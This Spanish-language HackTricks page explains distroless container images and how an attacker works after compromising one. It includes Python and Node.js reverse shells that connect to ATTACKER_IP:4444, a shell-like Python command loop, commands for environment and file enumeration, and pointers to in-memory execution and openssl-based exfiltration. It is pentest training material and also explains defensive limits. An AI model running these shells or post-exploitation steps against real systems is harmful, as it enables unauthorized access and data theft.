# Contenedores Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Una imagen de contenedor **distroless** es una imagen que incluye los **componentes mínimos de runtime necesarios para ejecutar una aplicación específica**, al tiempo que elimina intencionalmente las herramientas habituales de la distribución, como gestores de paquetes, shells y grandes conjuntos de utilidades genéricas de userland. En la práctica, las imágenes distroless a menudo contienen solo el binario o runtime de la aplicación, sus bibliotecas compartidas, paquetes de certificados y una estructura de sistema de archivos muy reducida.

La cuestión no es que distroless sea un nuevo primitivo de aislamiento del kernel. Distroless es una **estrategia de diseño de imágenes**. Cambia lo que está disponible **dentro** del sistema de archivos del contenedor, no la forma en que el kernel aísla el contenedor. Esa distinción importa, porque distroless fortalece el entorno principalmente reduciendo lo que un atacante puede usar tras obtener ejecución de código. No sustituye a namespaces, seccomp, capabilities, AppArmor, SELinux ni a ningún otro mecanismo de aislamiento en tiempo de ejecución.

## Por qué existen las imágenes Distroless

Las imágenes distroless se usan principalmente para reducir:

- el tamaño de la imagen
- la complejidad operativa de la imagen
- la cantidad de paquetes y binarios que podrían contener vulnerabilidades
- la cantidad de herramientas de post-explotación disponibles para un atacante por defecto

Por eso las imágenes distroless son populares en despliegues de aplicaciones en producción. Un contenedor que no contiene shell, ni gestor de paquetes, y casi ninguna herramienta genérica suele ser más fácil de razonar operativamente y más difícil de abusar de forma interactiva tras una compromisión.

Ejemplos de familias de imágenes estilo distroless bien conocidas incluyen:

- las imágenes distroless de Google
- las imágenes hardened/minimal de Chainguard

## Lo que Distroless no significa

Un contenedor distroless **no** es:

- automáticamente rootless
- automáticamente sin privilegios
- automáticamente de solo lectura
- automáticamente protegido por seccomp, AppArmor o SELinux
- automáticamente seguro frente a escapes de contenedor

Todavía es posible ejecutar una imagen distroless con `--privileged`, compartiendo namespaces del host, montajes bind peligrosos, o un socket de runtime montado. En ese escenario, la imagen puede ser mínima, pero el contenedor aún puede ser catastróficamente inseguro. Distroless cambia la **superficie de ataque de userland**, no el **límite de confianza del kernel**.

## Características operativas típicas

Cuando comprometes un contenedor distroless, lo primero que normalmente notas es que las suposiciones comunes dejan de ser válidas. Puede que no haya `sh`, no haya `bash`, no haya `ls`, no haya `id`, no haya `cat`, y a veces ni siquiera exista un entorno basado en libc que se comporte como tu tradecraft habitual espera. Esto afecta tanto a la ofensiva como a la defensa, porque la falta de herramientas hace que el debugging, la respuesta a incidentes y la post-explotación sean diferentes.

Los patrones más comunes son:

- existe el runtime de la aplicación, pero poco más
- los payloads basados en shell fallan porque no hay shell
- los one-liners de enumeración comunes fallan porque faltan los binarios auxiliares
- protecciones del sistema de archivos como rootfs de solo lectura o `noexec` en ubicaciones tmpfs escribibles suelen estar presentes también

Esa combinación es la que suele llevar a la gente a hablar de "weaponizing distroless".

## Distroless y post-explotación

El principal desafío ofensivo en un entorno distroless no siempre es el RCE inicial. A menudo es lo que viene después. Si la carga de trabajo explotada otorga ejecución de código en un runtime de lenguaje como Python, Node.js, Java o Go, puedes ser capaz de ejecutar lógica arbitraria, pero no a través de los flujos de trabajo centrados en shell que son comunes en otros objetivos Linux.

Eso significa que la post-explotación a menudo se desplaza en una de tres direcciones:

1. **Usar directamente el runtime del lenguaje existente** para enumerar el entorno, abrir sockets, leer archivos o preparar payloads adicionales.
2. **Cargar tus propias herramientas en memoria** si el sistema de archivos es de solo lectura o las ubicaciones escribibles están montadas con `noexec`.
3. **Abusar de binarios existentes ya presentes en la imagen** si la aplicación o sus dependencias incluyen algo inesperadamente útil.

## Abuso

### Enumerar el runtime que ya tienes

En muchos contenedores distroless no hay shell, pero aún existe un runtime de la aplicación. Si el objetivo es un servicio Python, Python está presente. Si el objetivo es Node.js, Node está presente. Eso a menudo proporciona suficiente funcionalidad para enumerar archivos, leer variables de entorno, abrir reverse shells y preparar ejecución en memoria sin invocar nunca `/bin/sh`.

Un ejemplo simple con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un ejemplo simple con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperación de variables de entorno, a menudo incluyendo credenciales o endpoints de servicio
- enumeración del sistema de archivos sin `/bin/ls`
- identificación de rutas con permisos de escritura y secretos montados

### Reverse Shell Without `/bin/sh`

Si la imagen no contiene `sh` o `bash`, un reverse shell clásico basado en shell puede fallar inmediatamente. En esa situación, usa el runtime del lenguaje instalado en su lugar.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` no existe, reemplaza la línea final por la ejecución de comandos directamente impulsada por Python o por un bucle REPL de Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
De nuevo, si `/bin/sh` está ausente, utiliza directamente las APIs de filesystem, process y networking de Node en lugar de crear un shell.

### Ejemplo completo: Bucle de comandos Python sin shell

Si la imagen tiene Python pero no dispone de ningún shell, un simple bucle interactivo suele ser suficiente para mantener una capacidad completa de post-explotación:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Esto no requiere un binario de shell interactivo. El impacto es, en la práctica, el mismo que el de un shell básico desde la perspectiva del atacante: ejecución de comandos, enumeración y staging de payloads adicionales a través del runtime existente.

### Ejecución de herramientas en memoria

Las imágenes distroless suelen combinarse con:

- `readOnlyRootFilesystem: true`
- tmpfs escribible pero con `noexec` como `/dev/shm`
- falta de herramientas de gestión de paquetes

Esa combinación hace que los flujos clásicos de "descargar el binario al disco y ejecutarlo" sean poco fiables. En esos casos, las técnicas de ejecución en memoria se convierten en la respuesta principal.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binarios ya presentes en la imagen

Algunas imágenes distroless aún contienen binarios necesarios para la operación que resultan útiles después de un compromiso. Un ejemplo observado repetidamente es `openssl`, porque las aplicaciones a veces lo necesitan para tareas relacionadas con crypto o TLS.

Un patrón de búsqueda rápido es:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` está presente, puede ser útil para:

- conexiones TLS salientes
- exfiltración de datos a través de un canal de egress permitido
- preparar datos de payload mediante blobs codificados/encriptados

El abuso exacto depende de lo que esté realmente instalado, pero la idea general es que distroless no significa "sin herramientas en absoluto"; significa "muchas menos herramientas que una imagen de distribución normal".

## Comprobaciones

El objetivo de estas comprobaciones es determinar si la imagen es realmente distroless en la práctica y qué runtime o helper binaries siguen disponibles para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Lo interesante aquí:

- Si no existe shell pero hay un runtime como Python o Node, la post-exploitation debería pivotar a la ejecución dirigida por el runtime.
- Si el sistema de archivos raíz es de solo lectura y `/dev/shm` es escribible pero `noexec`, las técnicas de ejecución en memoria se vuelven mucho más relevantes.
- Si existen binarios auxiliares como `openssl`, `busybox` o `java`, pueden ofrecer suficiente funcionalidad para obtener acceso adicional.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Userland mínimo por diseño | Sin shell, sin package manager, solo dependencias de aplicación/runtime | agregar capas de depuración, sidecar shells, copiar busybox o herramientas |
| Chainguard minimal images | Userland mínimo por diseño | Superficie de paquetes reducida, a menudo centrada en un solo runtime o servicio | usar `:latest-dev` o variantes de debug, copiar herramientas durante el build |
| Kubernetes workloads using distroless images | Depende de la configuración del Pod | Distroless afecta solo el userland; la postura de seguridad del Pod sigue dependiendo del spec del Pod y de los valores predeterminados del runtime | agregar contenedores de debug efímeros, montajes de host, configuraciones de Pod privilegiado |
| Docker / Podman running distroless images | Depende de los run flags | Sistema de archivos mínimo, pero la seguridad en tiempo de ejecución todavía depende de los flags y la configuración del daemon | `--privileged`, compartición de host namespace, montajes de socket del runtime, binds de host escribibles |

El punto clave es que distroless es una **propiedad de la imagen**, no una protección del runtime. Su valor proviene de reducir lo que está disponible dentro del sistema de archivos tras una compromisión.

## Related Pages

Para bypasses de filesystem y ejecución en memoria comúnmente necesarios en entornos distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para abuso del container runtime, sockets y montajes que aún aplica a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
